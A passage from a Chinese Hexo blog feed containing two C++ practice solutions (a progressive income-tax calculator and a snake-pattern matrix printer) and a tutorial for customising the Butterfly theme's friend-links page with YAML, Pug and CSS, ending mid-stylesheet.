        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><code>switch+level</code>这个办法是以前C语言老师教的，当时觉得好厉害~</p><h3 id="【问题描述】"><a href="#【问题描述】" class="headerlink" title="【问题描述】"></a>【问题描述】</h3><p>　　小明的公司每个月给小明发工资，而小明拿到的工资为交完个人所得税之后的工资。假设他一个月的税前工资（扣除五险一金后、未扣税前的工资）为S元，则他应交的个人所得税按如下公式计算：<br>　　1） 个人所得税起征点为3500元，若S不超过3500，则不交税，3500元以上的部分才计算个人所得税，令A=S-3500元；<br>　　2） A中不超过1500元的部分，税率3%；<br>　　3） A中超过1500元未超过4500元的部分，税率10%；<br>　　4） A中超过4500元未超过9000元的部分，税率20%；<br>　　5） A中超过9000元未超过35000元的部分，税率25%；<br>　　6） A中超过35000元未超过55000元的部分，税率30%；<br>　　7） A中超过55000元未超过80000元的部分，税率35%；<br>　　8） A中超过80000元的部分，税率45%；<br>　　例如，如果小明的税前工资为10000元，则A=10000-3500=6500元，其中不超过1500元部分应缴税1500×3%=45元，超过1500元不超过4500元部分应缴税(4500-1500)×10%=300元，超过4500元部分应缴税(6500-4500)×20%=400元。总共缴税745元，税后所得为9255元。<br>　　已知小明这个月税前所得为T元，请问他的税后工资S是多少元。 </p><h3 id="【输入形式】"><a href="#【输入形式】" class="headerlink" title="【输入形式】"></a>【输入形式】</h3><p>　　输入的第一行包含一个整数T，表示小明的税前所得。</p><h3 id="【输出形式】"><a href="#【输出形式】" class="headerlink" title="【输出形式】"></a>【输出形式】</h3><p>　　输出一个整数S，表示小明的税后工资。 </p><h3 id="【样例输入】"><a href="#【样例输入】" class="headerlink" title="【样例输入】"></a>【样例输入】</h3><p>　　10000</p><h3 id="【样例输出】"><a href="#【样例输出】" class="headerlink" title="【样例输出】"></a>【样例输出】</h3><p>　　9255</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>分析：</p><p>逆向思维，从高税率开始计算。</p><p>首先判断税前工资达到了缴税的哪一档，每超过一档<code>level++</code>，然后通过<code>switch</code>对每一档的金额计算应缴纳的税务。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">calculate</span><span class="params">(<span class="type">int</span> s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> s_ = s - <span class="number">3500</span>;</span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> level = (s_ &gt;= <span class="number">0</span>) + (s_ &gt;= <span class="number">1500</span>) + (s_ &gt;= <span class="number">4500</span>) + (s_ &gt;= <span class="number">9000</span>) + (s_ &gt;= <span class="number">35000</span>) + (s_ &gt;= <span class="number">55000</span>) + (s_ &gt;= <span class="number">80000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (level)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">sum += (s_ - <span class="number">80000</span>) * <span class="number">0.45</span>;</span><br><span class="line">s_ = <span class="number">80000</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">sum += (s_ - <span class="number">55000</span>) * <span class="number">0.35</span>;</span><br><span class="line">s_ = <span class="number">55000</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">sum += (s_ - <span class="number">35000</span>) * <span class="number">0.3</span>;</span><br><span class="line">s_ = <span class="number">35000</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">sum += (s_ - <span class="number">9000</span>) * <span class="number">0.25</span>;</span><br><span class="line">s_ = <span class="number">9000</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">sum += (s_ - <span class="number">4500</span>) * <span class="number">0.2</span>;</span><br><span class="line">s_ = <span class="number">4500</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">sum += (s_ - <span class="number">1500</span>) * <span class="number">0.1</span>;</span><br><span class="line">s_ = <span class="number">1500</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">sum += s_ * <span class="number">0.03</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> s - sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> s;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;请输入税前工资(元)：&quot;</span>;</span><br><span class="line">cin &gt;&gt; s;</span><br><span class="line">s = <span class="built_in">calculate</span>(s);</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;您的税后工资为：&quot;</span> &lt;&lt; s &lt;&lt; <span class="string">&quot;元&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蛇形打印</title>
      <link href="/post/1fbe3173.html"/>
      <url>/post/1fbe3173.html</url>
      
        <content type="html"><![CDATA[<h3 id="【问题描述】"><a href="#【问题描述】" class="headerlink" title="【问题描述】"></a>【问题描述】</h3><p>蛇形填数</p><p>在n×n方阵里填入1，2，…，n×n，要求填成蛇形。例如，n＝4时方阵为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> 1  2  3  4</span><br><span class="line"></span><br><span class="line">12 13 14  5</span><br><span class="line"></span><br><span class="line">11 16 15  6</span><br><span class="line"></span><br><span class="line">10  9  8  7</span><br></pre></td></tr></table></figure><p>为了美化效果，我们设置<strong>每个数宽度为4，填充符号为*</strong>。先输入n值，n≤10。</p><h3 id="【样例输入】"><a href="#【样例输入】" class="headerlink" title="【样例输入】"></a>【样例输入】</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4</span><br></pre></td></tr></table></figure><h3 id="【样例输出】"><a href="#【样例输出】" class="headerlink" title="【样例输出】"></a>【样例输出】</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">***1***2***3***4</span><br><span class="line"></span><br><span class="line">**12**13**14***5</span><br><span class="line"></span><br><span class="line">**11**16**15***6</span><br><span class="line"></span><br><span class="line">**10***9***8***7</span><br></pre></td></tr></table></figure><h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p>总循环次数为<code>n / 2</code>，每一次循环打印一圈，每一圈分为四条边，每条边的定位和长度与循环的当前次数关联</p><p><code>ps</code>：使用动态二维数组可以保证n的值随意设定；要使用普通二维数组的话把<code>num</code>重新定义并删除初始化动态二维数组即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> n, res = <span class="number">1</span>;</span><br><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; num;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; temp;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line">    <span class="comment">// 初始化动态二维数组</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line">&#123;</span><br><span class="line">temp.<span class="built_in">clear</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; ++j)</span><br><span class="line">&#123;</span><br><span class="line">temp.<span class="built_in">push_back</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">num.<span class="built_in">push_back</span>(temp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n / <span class="number">2</span>; ++i)<span class="comment">// 总循环圈数</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = i; j &lt; n - i - <span class="number">1</span>; ++j)</span><br><span class="line">&#123;</span><br><span class="line">num[i][j] = res++;</span><br><span class="line">&#125;<span class="comment">// 上边</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = i; j &lt; n - i - <span class="number">1</span>; ++j)</span><br><span class="line">&#123;</span><br><span class="line">num[j][n - i - <span class="number">1</span>] = res++;</span><br><span class="line">&#125;<span class="comment">// 右边</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = n - i - <span class="number">1</span>; j &gt; i; --j)</span><br><span class="line">&#123;</span><br><span class="line">num[n - i - <span class="number">1</span>][j] = res++;</span><br><span class="line">&#125;<span class="comment">// 下边</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = n - i - <span class="number">1</span>; j &gt; i; --j)</span><br><span class="line">&#123;</span><br><span class="line">num[j][i] = res++;</span><br><span class="line">&#125;<span class="comment">// 左边</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (n % <span class="number">2</span> != <span class="number">0</span>)</span><br><span class="line">num[n/<span class="number">2</span>][n/<span class="number">2</span>] = res;<span class="comment">// n为奇数时正中间的数字未赋值就会退出循环，在此补上</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; ++j)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="built_in">setw</span>(<span class="number">4</span>) &lt;&lt; <span class="built_in">setfill</span>(<span class="string">&#x27;*&#x27;</span>) &lt;&lt; right &lt;&lt; num[i][j];</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>魔改友人帐</title>
      <link href="/post/9a58847d.html"/>
      <url>/post/9a58847d.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>转载自：<a href="https://anzhiy.cn/posts/292d.html">给butterfly添加不一样的友链</a></p><details class="folding-tag" ><summary> 效果预览 </summary>              <div class='content'>              <p><img src="https://s1.ax1x.com/2023/06/03/pCp2Y0H.png" alt=""></p>              </div>            </details><h2 id="魔改步骤"><a href="#魔改步骤" class="headerlink" title="魔改步骤"></a>魔改步骤</h2><ol><li>在<code>Blog根目录</code>下打开终端，输入</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page <span class="built_in">link</span></span><br></pre></td></tr></table></figure><ol><li>打开<code>[Blogroot]\source\link\index.md</code>,添加一行<code>type: &#39;link&#39;</code>:</li></ol><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 友人帐</span><br><span class="line">date: 2020-12-01 22:19:45</span><br><span class="line"><span class="section">type: &#x27;link&#x27;</span></span><br><span class="line"><span class="section">---</span></span><br></pre></td></tr></table></figure><ol><li>新建文件<code>[Blogroot]\source\_data\link.yml</code>，输入：</li></ol><p>注：样式可选择，以下均使用<code>flexcard</code>，<code>butterfly</code>样式可以自行体会</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">flink_style:</span> <span class="string">flexcard</span> <span class="string">||</span> <span class="string">butterfly</span></span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">class_name:</span> <span class="string">推荐博客</span></span><br><span class="line">  <span class="attr">flink_style:</span> <span class="string">flexcard</span></span><br><span class="line">  <span class="attr">link_list:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">快乐小凳凳`Blog</span></span><br><span class="line">      <span class="attr">link:</span> <span class="string">https://www.dqywy.top/</span></span><br><span class="line">      <span class="attr">avatar:</span> <span class="string">https://s1.ax1x.com/2023/05/21/p95hrtI.png</span></span><br><span class="line">      <span class="attr">descr:</span> <span class="string">Sow</span> <span class="string">nothing,</span> <span class="string">reap</span> <span class="string">nothing.</span></span><br><span class="line">      <span class="attr">siteshot:</span> <span class="string">https://s1.ax1x.com/2023/06/03/pCp6HHA.png</span></span><br></pre></td></tr></table></figure><ol><li>取消<code>[Blogroot]\_config.butterfly.yml</code>中<code>menu</code>配置项内<code>link</code>页面的注释。</li></ol><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">Home:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="attr">Archives:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-archive</span></span><br><span class="line">  <span class="attr">Tags:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-tags</span></span><br><span class="line">  <span class="attr">Categories:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-folder-open</span></span><br><span class="line">  <span class="comment"># List||fas fa-list:</span></span><br><span class="line">  <span class="comment">#   - Music || /music/ || icon-music</span></span><br><span class="line">  <span class="comment">#   - Movie || /movies/ || fas fa-video</span></span><br><span class="line">  <span class="attr">Link:</span> <span class="string">/link/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-link</span></span><br><span class="line">  <span class="comment"># About: /about/ || fas fa-heart</span></span><br></pre></td></tr></table></figure><ol><li>替换<code>[Blogroot]\themes\butterfly\layout\includes\page\flink.pug</code></li></ol><p>注：下列代码在鱼佬的代码基础上对<code>avatar</code>添加了链接(32行，35行)，以便移动端适配</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#article-container</span></span><br><span class="line">  <span class="keyword">if</span> top_img === false</span><br><span class="line">    h1.page-title= page.title</span><br><span class="line">  .flink</span><br><span class="line">    <span class="keyword">if</span> site.data.link</span><br><span class="line">      each i <span class="keyword">in</span> site.data.link</span><br><span class="line">        <span class="keyword">if</span> i.class_name</span><br><span class="line">          h2!= i.class_name</span><br><span class="line">        <span class="keyword">if</span> i.class_desc</span><br><span class="line">          .flink-desc!=i.class_desc</span><br><span class="line">        <span class="keyword">if</span> i.flink_style === <span class="string">&#x27;butterfly&#x27;</span></span><br><span class="line">          .butterfly-flink-<span class="built_in">list</span></span><br><span class="line">            each item <span class="keyword">in</span> i.link_list</span><br><span class="line">              .flink-<span class="built_in">list</span>-item</span><br><span class="line">                a(href=url_for(item.link)  title=item.name target=<span class="string">&quot;_blank&quot;</span>)</span><br><span class="line">                  .flink-item-icon</span><br><span class="line">                    <span class="keyword">if</span> theme.lazyload.enable</span><br><span class="line">                      img(data-lazy-src=url_for(item.avatar) onerror=`this.onerror=null;this.src=<span class="string">&#x27;` + url_for(theme.error_img.flink) + `&#x27;</span>` alt=item.name )</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                      img(src=url_for(item.avatar) onerror=`this.onerror=null;this.src=<span class="string">&#x27;` + url_for(theme.error_img.flink) + `&#x27;</span>` alt=item.name )</span><br><span class="line">                  .flink-item-info</span><br><span class="line">                    .flink-item-name= item.name</span><br><span class="line">                    .flink-item-desc(title=item.descr)= item.descr</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> i.flink_style === <span class="string">&#x27;flexcard&#x27;</span></span><br><span class="line">          .flexcard-flink-<span class="built_in">list</span></span><br><span class="line">            each item <span class="keyword">in</span> i.link_list</span><br><span class="line">              a.flink-<span class="built_in">list</span>-card(href=url_for(item.link) target=<span class="string">&#x27;_blank&#x27;</span> data-title=item.descr)</span><br><span class="line">                .wrapper.cover</span><br><span class="line">                  - var siteshot = item.siteshot ? url_for(item.siteshot) : <span class="string">&#x27;https://image.thum.io/get/width/400/crop/800/allowJPG/wait/20/noanimate/&#x27;</span> + item.link</span><br><span class="line">                  <span class="keyword">if</span> theme.lazyload.enable</span><br><span class="line">                    img.cover.fadeIn(data-lazy-src=siteshot onerror=`this.onerror=null;this.src=<span class="string">&#x27;` + url_for(theme.error_img.post_page) + `&#x27;</span>` alt=<span class="string">&#x27;&#x27;</span> )</span><br><span class="line">                    img.cover.fadeIn(data-lazy-src=avatar onerror=`this.onerror=null;this.src=<span class="string">&#x27;` + url_for(theme.error_img.post_page) + `&#x27;</span>` alt=<span class="string">&#x27;&#x27;</span> )</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    img.cover.fadeIn(src=siteshot onerror=`this.onerror=null;this.src=<span class="string">&#x27;` + url_for(theme.error_img.post_page) + `&#x27;</span>` alt=<span class="string">&#x27;&#x27;</span> )</span><br><span class="line">                    img.cover.fadeIn(data-lazy-src=avatar onerror=`this.onerror=null;this.src=<span class="string">&#x27;` + url_for(theme.error_img.post_page) + `&#x27;</span>` alt=<span class="string">&#x27;&#x27;</span> )</span><br><span class="line">                .info</span><br><span class="line">                  <span class="keyword">if</span> theme.lazyload.enable</span><br><span class="line">                    img.flink-avatar(data-lazy-src=url_for(item.avatar) onerror=`this.onerror=null;this.src=<span class="string">&#x27;` + url_for(theme.error_img.flink) + `&#x27;</span>` alt=<span class="string">&#x27;&#x27;</span> )</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    img(src=url_for(item.avatar) onerror=`this.onerror=null;this.src=<span class="string">&#x27;` + url_for(theme.error_img.flink) + `&#x27;</span>` alt=<span class="string">&#x27;&#x27;</span> )</span><br><span class="line">                  span.flink-sitename= item.name</span><br><span class="line">    != page.content</span><br></pre></td></tr></table></figure><ol><li>替换<code>[Blogroot]\themes\butterfly\source\css\_page\flink.styl</code></li></ol><p>注：下列代码在鱼佬的代码基础上对<code>avatar</code>禁用点击(176行)，避免移动端点击头像后放大头像导致无法跳转</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.flink-desc</span></span><br><span class="line">  <span class="attribute">margin</span>: .<span class="number">2rem</span> <span class="number">0</span> .<span class="number">5rem</span></span><br><span class="line"></span><br><span class="line">.butterfly-flink-list</span><br><span class="line">  overflow: auto</span><br><span class="line">  padding: <span class="number">10px</span> <span class="number">10px</span> <span class="number">0</span></span><br><span class="line">  text-align: center</span><br><span class="line"></span><br><span class="line">  &amp; &gt; .flink-list-item</span><br><span class="line">    position: relative</span><br><span class="line">    float: left</span><br><span class="line">    overflow: hidden</span><br><span class="line">    line-height: <span class="number">17px</span></span><br><span class="line">    -webkit-transform: <span class="built_in">translateZ</span>(<span class="number">0</span>)</span><br><span class="line">    height: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="built_in">calc</span>(<span class="number">100%</span> / <span class="number">5</span> - <span class="number">0.5rem</span>)</span><br><span class="line">    margin: <span class="number">0.5rem</span> <span class="number">0.25rem</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span 